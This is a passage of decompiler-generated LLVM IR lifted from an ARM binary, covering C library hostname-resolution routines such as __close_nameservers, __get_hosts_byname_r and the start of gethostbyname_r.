  br i1 %v2_203ec, label %dec_label_pc_203f4, label %dec_label_pc_20430

dec_label_pc_203f4:                               ; preds = %dec_label_pc_203e4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_203f8 = call i32 @malloc(i32 28)
  store i32 %v1_203f8, i32* %r0.global-to-local, align 4
  store i32 -34552, i32* %r3.global-to-local, align 4
  store i32 30176, i32* %r2.global-to-local, align 4
  %v2_20404 = icmp eq i32 %v1_203f8, 0
  %v1_20408 = load i32, i32* @r5, align 4
  br i1 %v2_20404, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_203f4
  %v3_20408 = add i32 %v1_20408, -34552
  store i32 %v3_20408, i32* %r3.global-to-local, align 4
  %v3_2040c28 = add i32 %v1_20408, 30176
  %v4_2040c29 = inttoptr i32 %v3_2040c28 to i32*
  store i32 0, i32* %v4_2040c29, align 4
  %v1_20410 = load i32, i32* %r3.global-to-local, align 4
  %v2_20410 = load i32, i32* @r5, align 4
  %v3_20410 = load i32, i32* %r2.global-to-local, align 4
  %v4_20410 = add i32 %v3_20410, %v2_20410
  %v5_20410 = inttoptr i32 %v4_20410 to i32*
  store i32 %v1_20410, i32* %v5_20410, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_203f4
  %v3_2040c = add i32 %v1_20408, 30176
  %v4_2040c = inttoptr i32 %v3_2040c to i32*
  store i32 %v1_203f8, i32* %v4_2040c, align 4
  %v1_20414 = load i32, i32* @r5, align 4
  %v2_20414 = load i32, i32* %r3.global-to-local, align 4
  %v3_20414 = add i32 %v2_20414, %v1_20414
  store i32 %v3_20414, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 132128, i32* @lr, align 4
  %v1_2041c = xor i1 %v2_20404, true
  call void @__pseudo_cond_branch(i1 %v1_2041c, i32 ptrtoint (i32* @global_var_15be0.1615 to i32))
  store i32 30180, i32* %r2.global-to-local, align 4
  %v0_20424 = load i32, i32* @r5, align 4
  %v2_20424 = add i32 %v0_20424, 30180
  %v3_20424 = inttoptr i32 %v2_20424 to i32*
  %v4_20424 = load i32, i32* %v3_20424, align 4
  %v1_20428 = add i32 %v4_20424, 1
  store i32 %v1_20428, i32* %r3.global-to-local, align 4
  store i32 %v1_20428, i32* %v3_20424, align 4
  %v0_20434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_20430

dec_label_pc_20430:                               ; preds = %dec_label_pc_203e4, %.thread4
  %v0_20434 = phi i32 [ %v0_203e8, %dec_label_pc_203e4 ], [ %v0_20434.pre, %.thread4 ]
  store i32 30184, i32* @r7, align 4
  %v2_20434 = add i32 %v0_20434, 30184
  %v3_20434 = inttoptr i32 %v2_20434 to i32*
  %v4_20434 = load i32, i32* %v3_20434, align 4
  store i32 %v4_20434, i32* @r4, align 4
  %v2_20438 = icmp eq i32 %v4_20434, 0
  br i1 %v2_20438, label %dec_label_pc_20440, label %dec_label_pc_204c0

dec_label_pc_20440:                               ; preds = %dec_label_pc_20430
  %v2_20440 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_20440, i32* @r6, align 4
  store i32 %v2_20440, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_2044c = call i32 @__GI_gethostname(i32 %v2_20440, i32 255)
  store i32 %v2_2044c, i32* %r0.global-to-local, align 4
  %v2_20450 = icmp eq i32 %v2_2044c, 0
  br i1 %v2_20450, label %dec_label_pc_2045c, label %dec_label_pc_204c0

dec_label_pc_2045c:                               ; preds = %dec_label_pc_20440
  store i32 %v2_20440, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_20464 = call i32 @__GI_strchr(i32 %v2_20440, i32 46)
  store i32 %v2_20464, i32* %r0.global-to-local, align 4
  %v2_20468 = icmp eq i32 %v2_20464, 0
  br i1 %v2_20468, label %dec_label_pc_204c0, label %dec_label_pc_20470

dec_label_pc_20470:                               ; preds = %dec_label_pc_2045c
  %v1_20470 = add i32 %v2_20464, 1
  %v2_20470 = inttoptr i32 %v1_20470 to i8*
  %v3_20470 = load i8, i8* %v2_20470, align 1
  %v4_20470 = zext i8 %v3_20470 to i32
  store i32 %v4_20470, i32* %r3.global-to-local, align 4
  %v2_20474 = icmp eq i8 %v3_20470, 0
  store i32 %v1_20470, i32* %r0.global-to-local, align 4
  br i1 %v2_20474, label %dec_label_pc_204c0, label %dec_label_pc_20480

dec_label_pc_20480:                               ; preds = %dec_label_pc_20470
  %v2_20480 = call i32 @__GI_strdup(i8* %v2_20470)
  store i32 %v2_20480, i32* %r0.global-to-local, align 4
  store i32 %v2_20480, i32* @r4, align 4
  %v2_20484 = icmp eq i32 %v2_20480, 0
  br i1 %v2_20484, label %dec_label_pc_204c0, label %dec_label_pc_2048c

dec_label_pc_2048c:                               ; preds = %dec_label_pc_20480
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_20490 = call i32 @malloc(i32 4)
  store i32 %v1_20490, i32* %r0.global-to-local, align 4
  store i32 30172, i32* %r3.global-to-local, align 4
  %v2_20498 = icmp eq i32 %v1_20490, 0
  %v1_2049c = load i32, i32* @r5, align 4
  %v3_2049c = add i32 %v1_2049c, 30172
  %v4_2049c = inttoptr i32 %v3_2049c to i32*
  store i32 %v1_20490, i32* %v4_2049c, align 4
  br i1 %v2_20498, label %dec_label_pc_204a4, label %dec_label_pc_204b0

dec_label_pc_204a4:                               ; preds = %dec_label_pc_2048c
  %v0_204a4 = load i32, i32* @r4, align 4
  store i32 %v0_204a4, i32* @r0, align 4
  %v0_204a8 = call i32 @free()
  store i32 %v0_204a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_204c0

dec_label_pc_204b0:                               ; preds = %dec_label_pc_2048c
  %v0_204b0 = load i32, i32* @r5, align 4
  %v1_204b0 = load i32, i32* @r7, align 4
  %v2_204b0 = add i32 %v1_204b0, %v0_204b0
  %v3_204b0 = inttoptr i32 %v2_204b0 to i32*
  %v4_204b0 = load i32, i32* %v3_204b0, align 4
  %v1_204b4 = add i32 %v4_204b0, 1
  store i32 %v1_204b4, i32* %r3.global-to-local, align 4
  %v0_204b8 = load i32, i32* @r4, align 4
  %v2_204b8 = inttoptr i32 %v1_20490 to i32*
  store i32 %v0_204b8, i32* %v2_204b8, align 4
  %v0_204bc = load i32, i32* %r3.global-to-local, align 4
  %v1_204bc = load i32, i32* @r5, align 4
  %v2_204bc = load i32, i32* @r7, align 4
  %v3_204bc = add i32 %v2_204bc, %v1_204bc
  %v4_204bc = inttoptr i32 %v3_204bc to i32*
  store i32 %v0_204bc, i32* %v4_204bc, align 4
  br label %dec_label_pc_204c0

dec_label_pc_204c0:                               ; preds = %dec_label_pc_20440, %dec_label_pc_20430, %dec_label_pc_2011c, %dec_label_pc_20480, %dec_label_pc_20470, %dec_label_pc_2045c, %dec_label_pc_204a4, %dec_label_pc_204b0
  store i32 30168, i32* %r3.global-to-local, align 4
  %v0_204c4 = load i32, i32* @r5, align 4
  %v2_204c4 = add i32 %v0_204c4, 30168
  %v3_204c4 = inttoptr i32 %v2_204c4 to i32*
  %v4_204c4 = load i32, i32* %v3_204c4, align 4
  store i32 %v4_204c4, i32* %r0.global-to-local, align 4
  %v2_204c8 = icmp eq i32 %v4_204c4, 0
  br i1 %v2_204c8, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_204c0
  store i32 132308, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_204c0, %bb64
  %v2_204d0 = xor i1 %v2_204c8, true
  call void @__pseudo_cond_branch(i1 %v2_204d0, i32 %v4_204c4)
  %v2_204d8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_204d8, i32* %r4.global-to-local, align 4
  store i32 %v12_200cc, i32* @r7, align 4
  store i32 %v15_200cc, i32* @r8, align 4
  store i32 %v18_200cc, i32* @sb, align 4
  store i32 %v21_200cc, i32* @sl, align 4
  store i32 %v27_200cc, i32* %lr.global-to-local, align 4
  ret i32 %v4_204c4

; uselistorder directives
  uselistorder i32 %v4_204c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_20440, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_201d0, { 1, 0 }
  uselistorder i32 %v2_201b8, { 1, 0 }
  uselistorder i32 %v2_20198, { 1, 0 }
  uselistorder i32 %v2_203c0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_20390, { 1, 0, 2, 3 }
  uselistorder i32 %v1_20380, { 1, 0 }
  uselistorder i32 %v0_20320, { 1, 0, 2 }
  uselistorder i32 %v1_2029817, { 1, 0 }
  uselistorder i32 %v1_2029010, { 1, 0 }
  uselistorder i32 %v0_202909, { 1, 0 }
  uselistorder i32 %v1_20298, { 1, 0 }
  uselistorder i32 %v3_20214, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 22, 0, 13, 14, 15, 28, 18, 16, 17, 19, 20, 21, 23, 24, 25, 26, 27 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 18, 6, 17, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 7, 6, 8, 10, 9, 12, 11, 14, 13, 1, 0, 15, 17, 16, 19, 18, 20, 22, 21, 24, 23, 25, 26, 28, 27, 29, 31, 30, 36, 35, 51, 50, 32, 33, 34, 38, 37, 40, 39, 41, 43, 42, 44, 46, 45, 47, 49, 48, 54, 52, 53, 56, 55 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 6, 4, 7, 1, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 2, 1 }
  uselistorder i16 2, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 32, 34, 35, 2, 36, 31, 3, 4, 42, 37, 38, 40, 41, 21, 49, 48, 33, 0, 39, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 1, 29, 30, 23, 24, 25, 26, 27, 28, 43, 44, 45, 46, 47 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 -34656, { 1, 0 }
  uselistorder i32 1155, { 0, 2, 4, 5, 1, 3, 6 }
  uselistorder i32 -34628, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34628), { 1, 0 }
  uselistorder i32 30168, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_204c0, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_20430, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_203e4, { 1, 0 }
  uselistorder label %dec_label_pc_203dc, { 1, 0 }
  uselistorder label %dec_label_pc_202a0, { 1, 0 }
  uselistorder label %dec_label_pc_203c0.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_2011c, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_20528 = load i32, i32* @r4, align 4
  store i32 %v3_20528, i32* %stack_var_-20, align 4
  store i32 30176, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  store i32 -34552, i32* %r3.global-to-local, align 4
  %v4_2053c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30176) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34552), i32* %r3.global-to-local, align 4
  store i32 132432, i32* @lr, align 4
  %v1_2054c = icmp ne i32 %v4_2053c, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34552)
  call void @__pseudo_cond_branch(i1 %v1_2054c, i32 ptrtoint (i32* @global_var_17778.1695 to i32))
  store i32 30180, i32* %r3.global-to-local, align 4
  store i32 30184, i32* @r7, align 4
  store i32 30172, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_20560 = load i32, i32* @r5, align 4
  %v3_20560 = add i32 %v1_20560, 30180
  %v4_20560 = inttoptr i32 %v3_20560 to i32*
  store i32 0, i32* %v4_20560, align 4
  %v0_20564 = load i32, i32* %r2.global-to-local, align 4
  %v1_20564 = load i32, i32* @r5, align 4
  %v2_20564 = load i32, i32* %r4.global-to-local, align 4
  %v3_20564 = add i32 %v2_20564, %v1_20564
  %v4_20564 = inttoptr i32 %v3_20564 to i32*
  store i32 %v0_20564, i32* %v4_20564, align 4
  br label %dec_label_pc_2057c

dec_label_pc_2056c:                               ; preds = %dec_label_pc_2057c
  store i32 %v4_20590, i32* %r3.global-to-local, align 4
  store i32 %v1_20584, i32* %v3_2057c, align 4
  %v0_20574 = load i32, i32* %r3.global-to-local, align 4
  %v1_20574 = load i32, i32* %r2.global-to-local, align 4
  %v4_20574 = mul i32 %v1_20574, 4
  %v5_20574 = add i32 %v4_20574, %v0_20574
  %v6_20574 = inttoptr i32 %v5_20574 to i32*
  %v7_20574 = load i32, i32* %v6_20574, align 4
  store i32 %v7_20574, i32* @r0, align 4
  %v0_20578 = call i32 @free()
  br label %dec_label_pc_2057c

dec_label_pc_2057c:                               ; preds = %entry, %dec_label_pc_2056c
  %v0_2057c = load i32, i32* @r5, align 4
  %v1_2057c = load i32, i32* @r7, align 4
  %v2_2057c = add i32 %v1_2057c, %v0_2057c
  %v3_2057c = inttoptr i32 %v2_2057c to i32*
  %v4_2057c = load i32, i32* %v3_2057c, align 4
  store i32 %v4_2057c, i32* @r4, align 4
  %v2_20580 = icmp eq i32 %v4_2057c, 0
  %v1_20584 = add i32 %v4_2057c, -1
  store i32 %v1_20584, i32* %r2.global-to-local, align 4
  %v0_20588 = load i32, i32* @r6, align 4
  store i32 %v0_20588, i32* %r3.global-to-local, align 4
  %v2_20590 = add i32 %v0_20588, %v0_2057c
  %v3_20590 = inttoptr i32 %v2_20590 to i32*
  %v4_20590 = load i32, i32* %v3_20590, align 4
  br i1 %v2_20580, label %dec_label_pc_20590, label %dec_label_pc_2056c

dec_label_pc_20590:                               ; preds = %dec_label_pc_2057c
  store i32 %v4_20590, i32* @r0, align 4
  %v0_20594 = call i32 @free()
  %v0_20598 = load i32, i32* @r4, align 4
  %v1_20598 = load i32, i32* @r5, align 4
  %v2_20598 = load i32, i32* @r6, align 4
  %v3_20598 = add i32 %v2_20598, %v1_20598
  %v4_20598 = inttoptr i32 %v3_20598 to i32*
  store i32 %v0_20598, i32* %v4_20598, align 4
  %v2_205a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_205a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_20594

; uselistorder directives
  uselistorder i32 %v4_20590, { 1, 0 }
  uselistorder i32 %v1_20584, { 1, 0 }
  uselistorder i32* %v3_2057c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 30172, { 3, 1, 6, 4, 5, 0, 2 }
  uselistorder i32 30184, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 30180, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -34552, { 1, 2, 0, 3 }
  uselistorder i32 30176, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_2057c, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1) local_unnamed_addr {
entry:
  %v0_205c0 = load i32, i32* @lr, align 4
  %v0_205cc = load i32, i32* @r1, align 4
  store i32 %v0_205cc, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %v0_205cc, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_205fc = call i32 @__read_etc_hosts_r()
  store i32 %v0_205c0, i32* @lr, align 4
  ret i32 %v0_205fc
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp28, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_20614 = load i32, i32* @r1, align 4
  store i32 %v0_20614, i32* @r7, align 4
  store i32 %tmp28, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_20620 = load i32, i32* @r0, align 4
  store i32 %v0_20620, i32* @fp, align 4
  %v2_20620 = icmp eq i32 %v0_20620, 0
  %v2_20624 = inttoptr i32 %tmp28 to i32*
  store i32 0, i32* %v2_20624, align 4
  %v0_20628 = load i32, i32* @r2, align 4
  %v0_2062c = load i32, i32* @r3, align 4
  store i32 %v0_2062c, i32* @r6, align 4
  br i1 %v2_20620, label %bb, label %dec_label_pc_20638

bb:                                               ; preds = %entry
  %v1_20630 = load i32, i32* @r5, align 4
  %v2_20630 = add i32 %v1_20630, 22
  store i32 %v2_20630, i32* @r5, align 4
  br label %dec_label_pc_20928

dec_label_pc_20638:                               ; preds = %entry
  store i32 72248, i32* %r3.global-to-local, align 4
  store i32 72244, i32* %r2.global-to-local, align 4
  %v0_20640 = call i32 @__aeabi_read_tp()
  store i32 %v0_20640, i32* %r0.global-to-local, align 4
  %v3_20648 = load i16, i16* @global_var_32088.1320, align 2
  %v4_20648 = sext i16 %v3_20648 to i32
  store i32 %v4_20648, i32* %r3.global-to-local, align 4
  store i32 %v4_20648, i32* %r2.global-to-local, align 4
  %v2_20650 = add i32 %v4_20648, %v0_20640
  %v3_20650 = inttoptr i32 %v2_20650 to i32*
  %v4_20650 = load i32, i32* %v3_20650, align 4
  store i32 %v4_20650, i32* @r8, align 4
  %v0_20654 = load i32, i32* @r5, align 4
  store i32 %v0_20654, i32* %v3_20650, align 4
  store i32 %v0_20640, i32* @r4, align 4
  store i32 2, i32* @r1, align 4
  %v0_20668 = load i32, i32* @fp, align 4
  store i32 %v0_20668, i32* %r0.global-to-local, align 4
  %v0_2066c = load i32, i32* @r7, align 4
  store i32 %v0_2066c, i32* %r2.global-to-local, align 4
  store i32 %v0_20628, i32* %r3.global-to-local, align 4
  %v1_2067c = call i32 @__get_hosts_byname_r(i32 %v0_20668)
  store i32 %v1_2067c, i32* %r0.global-to-local, align 4
  store i32 %v1_2067c, i32* @r5, align 4
  %v2_20680 = icmp eq i32 %v1_2067c, 0
  br i1 %v2_20680, label %.thread4, label %dec_label_pc_20694

.thread4:                                         ; preds = %dec_label_pc_20638
  store i32 72184, i32* %r3.global-to-local, align 4
  %v4_20688 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20690.1876 to i32), i32 72184) to i32*), align 4
  store i32 %v4_20688, i32* %r3.global-to-local, align 4
  %v1_2068c = load i32, i32* @r8, align 4
  %v2_2068c = load i32, i32* @r4, align 4
  %v4_2068c = add i32 %v2_2068c, %v4_20688
  %v5_2068c = inttoptr i32 %v4_2068c to i32*
  store i32 %v1_2068c, i32* %v5_2068c, align 4
  br label %dec_label_pc_20928

dec_label_pc_20694:                               ; preds = %dec_label_pc_20638
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  %v1_20698 = inttoptr i32 %tmp17 to i32*
  %v2_20698 = load i32, i32* %v1_20698, align 4
  store i32 %v2_20698, i32* %r3.global-to-local, align 4
  %v7_2069c = icmp eq i32 %v2_20698, 1
  br i1 %v7_2069c, label %dec_label_pc_206b8, label %dec_label_pc_206a4

dec_label_pc_206a4:                               ; preds = %dec_label_pc_20694
  %v7_206a4 = icmp eq i32 %v2_20698, 4
  br i1 %v7_206a4, label %dec_label_pc_206e0, label %dec_label_pc_206ac

dec_label_pc_206ac:                               ; preds = %dec_label_pc_206a4
  %v3_206ac = icmp eq i32 %v2_20698, -1
  br i1 %v3_206ac, label %dec_label_pc_206cc, label %dec_label_pc_20928

dec_label_pc_206b8:                               ; preds = %dec_label_pc_20694
  %v7_206b8 = icmp eq i32 %v1_2067c, 2
  br i1 %v7_206b8, label %.thread6, label %bb33

bb33:                                             ; preds = %dec_label_pc_206b8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_206e8

.thread6:                                         ; preds = %dec_label_pc_206b8
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_206e8

dec_label_pc_206cc:                               ; preds = %dec_label_pc_206ac
  %v3_206d0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_206d0 = sext i16 %v3_206d0 to i32
  store i32 %v4_206d0, i32* %r3.global-to-local, align 4
  %v0_206d4 = load i32, i32* @r4, align 4
  %v2_206d4 = add i32 %v0_206d4, %v4_206d0
  %v3_206d4 = inttoptr i32 %v2_206d4 to i32*
  %v4_206d4 = load i32, i32* %v3_206d4, align 4
  store i32 %v4_206d4, i32* %r3.global-to-local, align 4
  %v7_206d8 = icmp eq i32 %v4_206d4, 2
  br i1 %v7_206d8, label %dec_label_pc_206e0, label %dec_label_pc_20928

dec_label_pc_206e0:                               ; preds = %dec_label_pc_206cc, %dec_label_pc_206a4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_206e8

dec_label_pc_206e8:                               ; preds = %.thread6, %bb33, %dec_label_pc_206e0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_206e0 ], [ 0, %bb33 ], [ 1, %.thread6 ]
  store i32 72080, i32* %r3.global-to-local, align 4
  %v0_206ec = call i32 @__aeabi_read_tp()
  %v3_206f0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_206f0 = sext i16 %v3_206f0 to i32
  store i32 %tmp17, i32* @ip, align 4
  %v0_206f8 = load i32, i32* @r8, align 4
  %v3_206f8 = add i32 %v4_206f0, %v0_206ec
  %v4_206f8 = inttoptr i32 %v3_206f8 to i32*
  store i32 %v0_206f8, i32* %v4_206f8, align 4
  store i32 -1, i32* @r3, align 4
  %v1_20704 = load i32, i32* @ip, align 4
  %v2_20704 = inttoptr i32 %v1_20704 to i32*
  store i32 -1, i32* %v2_20704, align 4
  %v0_20708 = load i32, i32* @fp, align 4
  %v1_20708 = inttoptr i32 %v0_20708 to i8*
  store i32 %v0_20708, i32* %r0.global-to-local, align 4
  %v3_2070c = call i32 @strlen(i8* %v1_20708)
  store i32 %v3_2070c, i32* %r0.global-to-local, align 4
  %v1_20710 = add i32 %v3_2070c, 1
  store i32 %v1_20710, i32* @r4, align 4
  %v0_20714 = load i32, i32* @r6, align 4
  %v7_20718 = icmp sgt i32 %v0_20714, %v1_20710
  br i1 %v7_20718, label %dec_label_pc_2071c, label %dec_label_pc_20924

dec_label_pc_2071c:                               ; preds = %dec_label_pc_206e8
  %v0_2071c = load i32, i32* @fp, align 4
  store i32 %v0_2071c, i32* @r1, align 4
  store i32 %v1_20710, i32* @r2, align 4
  store i32 %v0_20628, i32* @r0, align 4
  %v0_20728 = call i32 @memcpy()
  store i32 %v0_20728, i32* %r0.global-to-local, align 4
  %v1_20730 = load i32, i32* @r4, align 4
  %v2_20730 = add i32 %v1_20730, %v0_20628
  store i32 %v2_20730, i32* %r1.global-to-local, align 4
  %v1_20734 = sub i32 0, %v2_20730
  %v1_20738 = load i32, i32* @r6, align 4
  %v2_20738 = sub i32 %v1_20738, %v1_20730
  store i32 %v2_20738, i32* %r2.global-to-local, align 4
  %v1_2073c = urem i32 %v1_20734, 4
  store i32 %v1_2073c, i32* %r3.global-to-local, align 4
  %v2_20740 = sub i32 %v2_20738, %v1_2073c
  store i32 %v2_20740, i32* @sl, align 4
  %v1_20744 = add i32 %v2_20740, -8
  store i32 %v1_20744, i32* @r5, align 4
  %v7_2074c = icmp slt i32 %v1_20744, 256
  br i1 %v7_2074c, label %dec_label_pc_20924, label %dec_label_pc_20750

dec_label_pc_20750:                               ; preds = %dec_label_pc_2071c
  %v2_20750 = add i32 %v1_2073c, %v2_20730
  store i32 %v2_20750, i32* @sb, align 4
  store i32 %v0_20628, i32* @ip, align 4
  %v1_20758 = add i32 %v2_20750, 8
  store i32 %v1_20758, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_20760 = add i32 %v2_20750, 16
  store i32 %v1_20760, i32* @r8, align 4
  %v4_20764 = inttoptr i32 %v2_20750 to i32*
  store i32 %v0_20628, i32* %v4_20764, align 4
  %v0_20768 = load i32, i32* @fp, align 4
  store i32 %v0_20768, i32* %r0.global-to-local, align 4
  %v0_2076c = load i32, i32* @r4, align 4
  %v1_2076c = load i32, i32* @sb, align 4
  %v2_2076c = add i32 %v1_2076c, 4
  %v3_2076c = inttoptr i32 %v2_2076c to i32*
  store i32 %v0_2076c, i32* %v3_2076c, align 4
  %v0_20770 = load i32, i32* @r8, align 4
  store i32 %v0_20770, i32* %r1.global-to-local, align 4
  %v2_20774 = inttoptr i32 %v0_20768 to i8*
  %v3_20774 = call i32 @inet_aton(i8* %v2_20774, i32 %v0_20770)
  store i32 %v3_20774, i32* %r0.global-to-local, align 4
  %v1_20778 = load i32, i32* @r4, align 4
  %v9_20778 = icmp eq i32 %v3_20774, %v1_20778
  br i1 %v9_20778, label %dec_label_pc_207bc, label %dec_label_pc_20780

dec_label_pc_20780:                               ; preds = %dec_label_pc_20750
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_20784 = load i32, i32* @r7, align 4
  %v2_20784 = add i32 %v1_20784, 8
  %v3_20784 = inttoptr i32 %v2_20784 to i32*
  store i32 2, i32* %v3_20784, align 4
  %v0_20788 = load i32, i32* %r3.global-to-local, align 4
  %v2_20788 = mul i32 %v0_20788, 2
  %v1_2078c = load i32, i32* @r7, align 4
  %v2_2078c = add i32 %v1_2078c, 12
  %v3_2078c = inttoptr i32 %v2_2078c to i32*
  store i32 %v2_20788, i32* %v3_2078c, align 4
  %v3_20790 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_20790, i32* %r1.global-to-local, align 4
  store i32 %v0_20628, i32* %r2.global-to-local, align 4
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %v0_2079c = load i32, i32* @r4, align 4
  store i32 %v0_2079c, i32* @r5, align 4
  %v0_207a0 = load i32, i32* @r8, align 4
  %v1_207a0 = load i32, i32* @sb, align 4
  %v2_207a0 = add i32 %v1_207a0, 8
  %v3_207a0 = inttoptr i32 %v2_207a0 to i32*
  store i32 %v0_207a0, i32* %v3_207a0, align 4
  %v0_207a4 = load i32, i32* @r7, align 4
  %v1_207a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_207a4 = inttoptr i32 %v1_207a4 to i32*
  store i32 %v0_207a4, i32* %v2_207a4, align 4
  %v0_207a8 = load i32, i32* @r7, align 4
  %v1_207a8 = inttoptr i32 %v0_207a8 to i32*
  %v2_207a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_207a8, i32* %v1_207a8, align 4
  %v3_207a8 = add i32 %v0_207a8, 4
  %v4_207a8 = inttoptr i32 %v3_207a8 to i32*
  %v5_207a8 = load i32, i32* @sb, align 4
  store i32 %v5_207a8, i32* %v4_207a8, align 4
  %v0_207ac = load i32, i32* @r6, align 4
  %v1_207ac = load i32, i32* @r7, align 4
  %v2_207ac = add i32 %v1_207ac, 16
  %v3_207ac = inttoptr i32 %v2_207ac to i32*
  store i32 %v0_207ac, i32* %v3_207ac, align 4
  %v0_207b0 = load i32, i32* @r4, align 4
  %v1_207b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_207b0 = inttoptr i32 %v1_207b0 to i32*
  store i32 %v0_207b0, i32* %v2_207b0, align 4
  %v0_207b4 = load i32, i32* @r4, align 4
  %v1_207b4 = load i32, i32* @r6, align 4
  %v2_207b4 = add i32 %v1_207b4, 4
  %v3_207b4 = inttoptr i32 %v2_207b4 to i32*
  store i32 %v0_207b4, i32* %v3_207b4, align 4
  br label %dec_label_pc_20928

dec_label_pc_207bc:                               ; preds = %dec_label_pc_20750
  store i32 %storemerge2, i32* @ip, align 4
  %v2_207c0 = icmp eq i32 %storemerge2, 0
  br i1 %v2_207c0, label %dec_label_pc_207c8, label %dec_label_pc_207f8

dec_label_pc_207c8:                               ; preds = %dec_label_pc_207bc
  %v0_207d4 = load i32, i32* @fp, align 4
  store i32 %v0_207d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
